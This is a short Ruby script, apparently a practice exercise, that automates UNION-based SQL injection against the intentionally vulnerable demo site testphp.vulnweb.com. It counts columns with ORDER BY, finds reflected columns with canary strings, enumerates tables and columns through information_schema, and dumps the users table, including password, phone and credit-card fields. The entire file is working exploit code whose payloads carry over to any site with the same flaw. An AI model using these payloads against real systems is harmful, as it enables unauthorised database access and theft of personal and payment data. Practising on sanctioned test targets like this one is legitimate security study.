require 'net/http'

VULNERABLE_URL = 'http://testphp.vulnweb.com/listproducts.php'
TABLE = []

def enum_column_number(base_url)
  uri = URI(base_url)
  Net::HTTP.start(uri.hostname) do |http|
    (1..).each do |i|
      uri.query = "cat=1 ORDER BY #{i}-- -" # SQL Injection make it order by i-th column
      response = http.get(uri).body
      if /Unknown column/.match?(response)
        puts "There are #{i - 1} columns in the table."
        break
      end
    end
  end
end

def find_vuln_columns(base_url)
  canaries = (1..11).map { |x| "%02dpungrumpy%02d" % [x,x] } # 01pungrumpy01, 02pungrumpy02, ..., 11pungrumpy11
  uri = URI(base_url)

  payload = canaries.map{|x| "'#{x}'"}.join(",") # '01pungrumpy01','02pungrumpy02',...,'11pungrumpy11'
  uri.query = "cat=1 UNION SELECT #{payload}"
  response = Net::HTTP.get(uri)
  canaries.each_with_index do |canary, i|
    puts "Column #{i + 1} is vulnerable." if response.include?(canary)
  end
end

def enum_tables(base_url)
  uri = URI(base_url)
  uri.query = 'cat=-1 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()-- -'
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links') # Remove the Links table (because it's not a real table)
  tables.each do |table|
    puts "Table: #{table}"
    TABLE << table
  end
end

def enum_columns(base_url, table)
  uri = URI(base_url)
  uri.query = "cat=-1 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_schema=database() AND table_name='#{table}'-- -"
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links')
  tables.each do |table|
    puts "Column: #{table}"
  end
end

def enum_users(base_url)
  uri = URI(base_url)
  uri.query = "cat=-1 UNION SELECT 1,2,3,4,5,6,concat(name,':',uname,':','<email>',':',pass,':',phone,':','<address>',':',cart,':',cc),8,9,10,11 FROM users"
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links')
  tables.each do |table|
    puts table
  end
end

# enum_column_number(VULNERABLE_URL)
# find_vuln_columns(VULNERABLE_URL)
# enum_tables(VULNERABLE_URL)
# enum_columns(VULNERABLE_URL, 'users')
enum_users(VULNERABLE_URL)

# for table in TABLE
#   enum_tables(VULNERABLE_URL)
#   puts "Table: #{table}"
#   enum_columns(VULNERABLE_URL, table)
# end
